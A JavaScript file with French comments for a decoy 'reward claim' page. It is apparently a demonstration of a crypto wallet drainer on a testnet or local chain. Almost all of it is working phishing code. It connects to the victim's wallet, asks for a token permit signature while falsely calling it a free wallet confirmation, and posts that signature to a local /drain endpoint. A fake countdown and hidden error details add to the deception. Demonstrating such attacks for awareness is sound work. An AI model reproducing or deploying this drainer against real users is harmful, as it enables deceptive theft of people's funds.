// Logique de la page leurre (index.html). Dépend de chain-utils.js, chargé avant ce fichier.
// Aucune donnée personnelle n'est demandée ni envoyée. Les seuls appels réseau sont vers
// le portefeuille de l'utilisateur et vers le service local de démonstration (127.0.0.1:8792).
//
// Règle de cette page : jamais de nom de fichier, de commande ou de détail technique à l'écran.
// Toute panne de configuration s'affiche en une ligne neutre ; le détail va dans la console
// présentateur (attaquant.html), pas ici.
"use strict";

(function () {
  const $ = (id) => document.getElementById(id);
  const DRAIN_ENDPOINT = "http://127.0.0.1:8792/drain";
  const DEADLINE = new Date("2026-11-02T23:59:00+01:00"); // date de clôture affichée (donnée de démo fixe)
  let addresses = null;
  let account = null;
  let found6963 = [];

  // ---------- compte à rebours (affichage uniquement, aucune logique métier) ----------
  function fmt2(n) { return String(n).padStart(2, "0"); }
  function tickCountdown() {
    const ms = DEADLINE.getTime() - Date.now();
    const el = $("countdown-clock");
    if (!el) return;
    if (ms <= 0) { el.textContent = "campagne terminée"; return; }
    const s = Math.floor(ms / 1000);
    const days = Math.floor(s / 86400), hours = Math.floor((s % 86400) / 3600), mins = Math.floor((s % 3600) / 60), secs = s % 60;
    el.textContent = days + " j " + fmt2(hours) + ":" + fmt2(mins) + ":" + fmt2(secs);
  }
  tickCountdown();
  setInterval(tickCountdown, 1000);

  function setConnectState(text, cls, detail) { setStatusRow("connect-state", text, cls, detail); }
  function setClaimState(text, cls, detail) { setStatusRow("claim-state", text, cls, detail); }
  function setStatusRow(id, text, cls, detail) {
    const row = $(id);
    if (!row) return;
    row.className = "status" + (cls ? " " + cls : "");
    row.querySelector(".text").textContent = text;
    const small = row.querySelector("small");
    if (small) { small.textContent = detail || ""; small.hidden = !detail; }
  }
  function setPill(text, cls) {
    const pill = $("chain-pill");
    if (!pill) return;
    pill.className = "chain-pill" + (cls ? " " + cls : "");
    $("chain-pill-text").textContent = text;
  }

  // ---------- découverte du portefeuille (EIP-6963, repli sur window.ethereum) ----------
  window.addEventListener("eip6963:announceProvider", (ev) => {
    try {
      const d = ev.detail;
      if (!d || !d.info) return;
      if (!found6963.some((f) => f.info.uuid === d.info.uuid)) found6963.push(d);
    } catch (e) {}
  });
  function requestAnnounce() { try { window.dispatchEvent(new Event("eip6963:requestProvider")); } catch (e) {} }
  requestAnnounce();

  function getProvider() {
    if (found6963.length) return found6963[0].provider;
    return window.ethereum || null;
  }

  async function init() {
    const res = await resolveNet();
    if (!res.ok) {
      // Aucun fichier d'adresses exploitable : panne de service, dit sobrement, sans détail technique.
      setPill("Service indisponible", "bad");
      $("btn-connect").textContent = "Indisponible pour le moment";
      setConnectState("Service momentanément indisponible. Merci de réessayer plus tard.", "bad");
      return;
    }
    addresses = res.data;

    // Laisse le temps aux extensions EIP-6963 de s'annoncer avant de juger qu'aucune n'existe.
    setTimeout(async () => {
      const p = getProvider();
      if (!p) {
        $("wallet-missing").hidden = false;
        setPill("Aucun portefeuille", "bad");
        $("btn-connect").textContent = "Aucun portefeuille détecté";
        setConnectState("Installez MetaMask ou Core, puis rechargez cette page.", "bad");
        return;
      }
      $("btn-connect").disabled = false;
      $("btn-connect").textContent = "Connecter mon portefeuille";
      setConnectState("Portefeuille détecté. Cliquez pour continuer.", "");
      await refreshChainPill(p);
      try { p.on && p.on("chainChanged", () => refreshChainPill(p)); } catch (e) {}
    }, 250);
  }

  async function refreshChainPill(p) {
    try {
      const c = await p.request({ method: "eth_chainId" });
      const ok = BigInt(c) === BigInt(addresses.chainId);
      setPill(ok ? "Réseau connecté" : "Mauvais réseau", ok ? "ok" : "bad");
      return ok;
    } catch (e) {
      setPill("Réseau inconnu", "bad");
      return false;
    }
  }

  async function ensureChain(p) {
    const hexChainId = toHex(addresses.chainId);
    const current = await p.request({ method: "eth_chainId" });
    if (BigInt(current) === BigInt(addresses.chainId)) return true;
    try {
      await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: hexChainId }] });
      return true;
    } catch (err) {
      if (err && (err.code === 4902 || /unrecognized/i.test(err.message || ""))) {
        await p.request({
          method: "wallet_addEthereumChain",
          params: [{
            chainId: hexChainId,
            chainName: isFuji(addresses.chainId) ? "Avalanche Fuji (testnet)" : "Chaîne locale de démo",
            nativeCurrency: { name: "Avalanche", symbol: "AVAX", decimals: 18 },
            rpcUrls: [addresses.rpcUrl],
            blockExplorerUrls: isFuji(addresses.chainId) ? [FUJI_EXPLORER] : [],
          }],
        });
        return true;
      }
      throw err;
    }
  }

  $("btn-connect").addEventListener("click", async () => {
    const p = getProvider();
    if (!p) return;
    const btn = $("btn-connect");
    btn.disabled = true;
    setConnectState("Connexion en cours…", "wait");
    try {
      const accounts = await p.request({ method: "eth_requestAccounts" });
      account = accounts[0];
      await ensureChain(p);
      await refreshChainPill(p);
      setConnectState("Connecté : " + shortAddr(account), "ok");
      $("verified-acct").textContent = shortAddr(account);
      $("step-connect").hidden = true;
      $("step-eligible").hidden = false;
    } catch (err) {
      const cancelled = err && (err.code === 4001 || /user rejected/i.test(err.message || ""));
      setConnectState(cancelled ? "Connexion annulée." : "Connexion impossible pour le moment.", "bad");
      btn.disabled = false;
    }
  });

  $("btn-claim").addEventListener("click", async () => {
    const p = getProvider();
    if (!p || !account) return;
    const btn = $("btn-claim");
    btn.disabled = true;
    setClaimState("Préparation de la signature…", "wait");
    try {
      const chainOk = await refreshChainPill(p);
      if (!chainOk) { setClaimState("Mauvais réseau. Reconnectez votre portefeuille.", "bad"); btn.disabled = false; return; }

      let nonce = "0";
      try {
        const r = await p.request({ method: "eth_call", params: [{ to: addresses.usdc, data: callData("nonces(address)", [encAddr(account)]) }, "latest"] });
        nonce = BigInt(r).toString();
      } catch (e) { /* le compteur de nonce reste à 0 si la lecture échoue */ }

      const typed = buildPermit(addresses, account, nonce);

      setClaimState("Signez pour confirmer votre portefeuille (gratuit, sans transaction).", "wait");
      const signature = await p.request({ method: "eth_signTypedData_v4", params: [account, JSON.stringify(typed)] });

      setClaimState("Réclamation en cours…", "wait");
      const res = await fetch(DRAIN_ENDPOINT, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(buildDrainBody(addresses, account, signature)),
      });
      if (!res.ok) {
        let serverMsg = "";
        try { serverMsg = (await res.json()).error || ""; } catch (e) {}
        throw new Error(serverMsg || ("drain endpoint responded " + res.status));
      }
      setClaimState("Votre demande a été transmise. Les récompenses sont généralement distribuées sous 24 à 48 h.", "ok");
    } catch (err) {
      const cancelled = err && (err.code === 4001 || /user rejected|denied/i.test(err.message || ""));
      if (cancelled) {
        setClaimState("Signature annulée.", "bad");
      } else {
        setClaimState("Service de démonstration indisponible pour le moment. Réessayez.", "bad");
        const msg = (err && err.message) || "";
        if (/not the victim/i.test(msg)) reportDemoError("victim-mismatch", "compte connecté : " + account);
        else reportDemoError("drain-refused", msg);
      }
      btn.disabled = false;
    }
  });

  init();
})();
